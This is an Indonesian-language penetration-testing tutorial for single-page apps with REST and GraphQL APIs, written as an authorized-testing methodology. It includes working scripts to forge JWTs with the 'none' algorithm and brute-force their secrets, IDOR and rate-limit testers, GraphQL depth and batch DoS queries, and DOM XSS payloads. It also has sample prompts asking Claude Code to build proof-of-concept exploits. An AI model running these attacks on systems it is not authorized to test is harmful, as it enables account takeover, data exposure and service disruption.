# Skenario 11 (Tambahan): Single Page Application (SPA) + REST/GraphQL API

**Berlaku untuk:** Semua environment  
**Stack umum:** React/Vue/Angular + Node.js/Laravel/Django API  
**Mengapa perlu tutorial khusus:** SPA memiliki attack surface yang berbeda fundamental dari aplikasi server-rendered tradisional

---

## Perbedaan SPA vs Aplikasi Tradisional

| Aspek | Aplikasi Tradisional | SPA + API |
|-------|---------------------|-----------|
| Rendering | Server-side | Client-side |
| Autentikasi | Session cookie | JWT / Bearer token |
| API | Tergabung di HTML | Terpisah, dokumentasi sendiri |
| Testing tool | Burp intercept form | Burp + API client (Postman) |
| CSRF | Kritis | Sering tidak ada (JWT-based) |
| Vulnerability khas | XSS reflected, SQLi di form | IDOR, JWT issues, GraphQL injection |

---

## Phase 1: Reconnaissance SPA

### Menemukan API Endpoint dari JavaScript

```bash
# Download dan analisis JS files
curl -s https://target.co.id/ | grep -oP '(?<=src=")[^"]+\.js' | \
  xargs -I{} curl -s "https://target.co.id/{}" | \
  grep -oP '(?<=["'"'"'])/api/[^"'"'"']+' | sort -u

# Atau gunakan LinkFinder
python3 linkfinder.py -i https://target.co.id -d -o results.html

# Grep untuk API base URL di JS
curl -s https://target.co.id/static/js/main.chunk.js | \
  grep -oP "(https?://[^'\"]+/api/[^'\"]*)" | sort -u
```

**Prompt Claude Code:**
```
Saya melakukan pentest pada SPA di target.co.id (React app).
Dari source JS, ditemukan endpoint berikut:

[PASTE LIST ENDPOINT YANG DITEMUKAN]

Dan dari Network tab browser DevTools saat login:
- POST /api/auth/login → returns JWT
- GET /api/users/me → profil saya
- GET /api/dashboard/stats
- GET /api/reports?page=1&limit=10

Analisis attack surface dan buat test plan untuk:
1. Endpoint yang mungkin rentan IDOR
2. Endpoint yang mungkin ada di server tapi tidak digunakan frontend
3. Parameter tersembunyi yang bisa dimanipulasi
4. Fuzz endpoint untuk temukan endpoint tersembunyi
```

### Fuzz API Endpoints

```bash
# ffuf untuk temukan endpoint API
ffuf -u https://target.co.id/api/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -H "Authorization: Bearer <JWT>" \
  -mc 200,201,400,403,405 \
  -o scans/web/api_endpoints.json

# Fuzz versi API
ffuf -u https://target.co.id/api/FUZZ/users \
  -w wordlists/api_versions.txt \  # v1, v2, v3, beta, internal, admin
  -H "Authorization: Bearer <JWT>" \
  -mc 200,400,403
```

---

## Phase 2: REST API Security Testing

### OWASP API Security Top 10

```python
# api_security_tester.py

import requests
import json

BASE = "https://target.co.id/api/v1"
HEADERS = {"Authorization": "Bearer <JWT>"}
MY_ID = 1042

tests = {
    # API1: Broken Object Level Authorization (BOLA/IDOR)
    "BOLA": [
        f"/users/{MY_ID - 1}",
        f"/users/{MY_ID + 1}",
        f"/orders/{12345}",
        f"/invoices/{67890}",
    ],
    
    # API2: Broken Authentication
    "AUTH": [
        "/users/me",           # tanpa token
        "/admin/users",        # dengan user token
    ],
    
    # API3: Broken Object Property Level Authorization
    "BOPLA": {
        "endpoint": f"/users/{MY_ID}",
        "method": "PATCH",
        "payloads": [
            {"role": "admin"},
            {"is_admin": True},
            {"subscription_plan": "enterprise"},
        ]
    },
    
    # API6: Unrestricted Resource Consumption
    "RATE_LIMIT": "/auth/login",
}

def run_bola_tests():
    for endpoint in tests["BOLA"]:
        resp = requests.get(BASE + endpoint, headers=HEADERS)
        if resp.status_code == 200:
            print(f"[BOLA] Accessible: {endpoint}")
            data = resp.json()
            if "email" in data or "phone" in data:
                print(f"  → PII exposed: {list(data.keys())}")

def run_rate_limit_test():
    success_count = 0
    for i in range(20):
        resp = requests.post(BASE + tests["RATE_LIMIT"],
                           json={"email": "test@t.com", "password": f"wrong{i}"})
        if resp.status_code != 429:
            success_count += 1
    print(f"[RATE LIMIT] {success_count}/20 requests passed without 429")
    if success_count > 10:
        print("  → No effective rate limiting!")

run_bola_tests()
run_rate_limit_test()
```

---

## Phase 3: GraphQL Security Testing

GraphQL memiliki kerentanan unik yang tidak ada di REST:

```bash
# Introspection query — dapatkan seluruh schema
curl -X POST https://target.co.id/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <JWT>" \
  -d '{"query": "{ __schema { types { name fields { name } } } }"}'

# Jika introspection disabled, coba field suggestion attack
curl -X POST https://target.co.id/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ user { emai } }"}'
  # Error "Did you mean 'email'?" → field name bocor
```

**Prompt Claude Code:**
```
GraphQL introspection dari target.co.id berhasil.
Schema yang ditemukan:

types:
- Query: user(id: ID), users, orders(userId: ID), adminStats
- Mutation: updateUser, deleteUser, createOrder, adminUpdateUser
- User: id, name, email, phone, role, salary, createdAt

Identifikasi:
1. Query 'users' tanpa filter — bisa dump semua user?
2. 'adminStats' dan 'adminUpdateUser' — bisa diakses user biasa?
3. Field 'salary' di User type — apakah exposed ke user biasa?
4. 'deleteUser' mutation — bisa hapus user lain?
5. Buatkan PoC query untuk setiap vulnerability
```

### GraphQL Injection dan DoS

```graphql
# Query depth attack (DoS)
query {
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            name  # Nested 10+ level → bisa overload server
          }
        }
      }
    }
  }
}

# Batch query attack
[
  {"query": "{ user(id: 1) { email } }"},
  {"query": "{ user(id: 2) { email } }"},
  ... (1000 queries dalam satu request)
]
```

---

## Phase 4: JWT Security Testing

```python
# jwt_attack.py
import base64
import hmac
import hashlib
import json
import requests

def none_algorithm_attack(token):
    """Ganti algoritma ke 'none' untuk bypass signature verification"""
    parts = token.split('.')
    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    
    # Ubah header: alg → none, ubah payload: role → admin
    header['alg'] = 'none'
    payload['role'] = 'admin'
    payload['is_admin'] = True
    
    new_header = base64.urlsafe_b64encode(
        json.dumps(header).encode()).rstrip(b'=').decode()
    new_payload = base64.urlsafe_b64encode(
        json.dumps(payload).encode()).rstrip(b'=').decode()
    
    # None algorithm: tidak ada signature
    forged_token = f"{new_header}.{new_payload}."
    return forged_token

def weak_secret_test(token, wordlist_path="wordlists/jwt_secrets.txt"):
    """Bruteforce JWT HS256 secret"""
    parts = token.split('.')
    message = f"{parts[0]}.{parts[1]}".encode()
    sig = base64.urlsafe_b64decode(parts[2] + '==')
    
    with open(wordlist_path) as f:
        for line in f:
            secret = line.strip().encode()
            test_sig = hmac.new(secret, message, hashlib.sha256).digest()
            if test_sig == sig:
                print(f"[!] JWT Secret FOUND: {secret.decode()}")
                return secret.decode()
    print("[-] Secret not found in wordlist")
    return None

# Atau gunakan hashcat (lebih cepat):
# hashcat -a 0 -m 16500 <JWT> /usr/share/wordlists/rockyou.txt
```

---

## Phase 5: SPA-Specific Vulnerabilities

### DOM-Based XSS

```javascript
// Cari di source JS untuk sink berbahaya
// Grep untuk:
// innerHTML, outerHTML, document.write, eval, location.hash, location.search

// Test: apakah nilai dari URL langsung masuk ke DOM?
// https://target.co.id/#/search?q=<img src=x onerror=alert(1)>
// https://target.co.id/?redirect=javascript:alert(1)
```

**Prompt Claude Code:**
```
Source code React dari target.co.id mengandung:

// SearchComponent.jsx
const SearchComponent = () => {
  const query = new URLSearchParams(window.location.search).get('q');
  return <div dangerouslySetInnerHTML={{__html: `Results for: ${query}`}} />;
}

// ProfilePage.jsx
const redirect = window.location.hash.substring(1);
window.location = redirect;  // open redirect!

Analisis:
1. Apakah dangerouslySetInnerHTML + URL param = DOM XSS?
2. Berikan payload XSS yang bekerja
3. window.location = redirect — apakah bisa dieksploitasi untuk open redirect?
4. Bisa redirect ke javascript: URI untuk XSS?
5. Fix code yang benar untuk keduanya
```

### CORS Misconfiguration

```bash
# Test CORS — apakah origin arbitrary diterima?
curl -H "Origin: https://evil.com" \
  -H "Authorization: Bearer <JWT>" \
  -I https://target.co.id/api/v1/users/me

# Cek response header:
# Access-Control-Allow-Origin: https://evil.com  ← VULNERABLE!
# Access-Control-Allow-Credentials: true         ← SANGAT BERBAHAYA!
```

---

## Checklist SPA + API Testing

```
[ ] Extract API endpoints dari JavaScript source
[ ] API endpoint fuzzing (versi, hidden endpoints)
[ ] GraphQL introspection (jika pakai GraphQL)
[ ] BOLA/IDOR testing pada semua resource endpoint
[ ] JWT: decode, none algorithm, weak secret bruteforce
[ ] Rate limiting: login, OTP, password reset
[ ] Mass assignment via API (PATCH/PUT dengan extra fields)
[ ] CORS misconfiguration test
[ ] DOM XSS testing (URL params ke innerHTML)
[ ] Open redirect via client-side routing
[ ] GraphQL DoS (depth, batch query)
[ ] API versioning: test v1 jika v2 sudah ada (older version mungkin less secure)
[ ] Unauthenticated API endpoint discovery
```
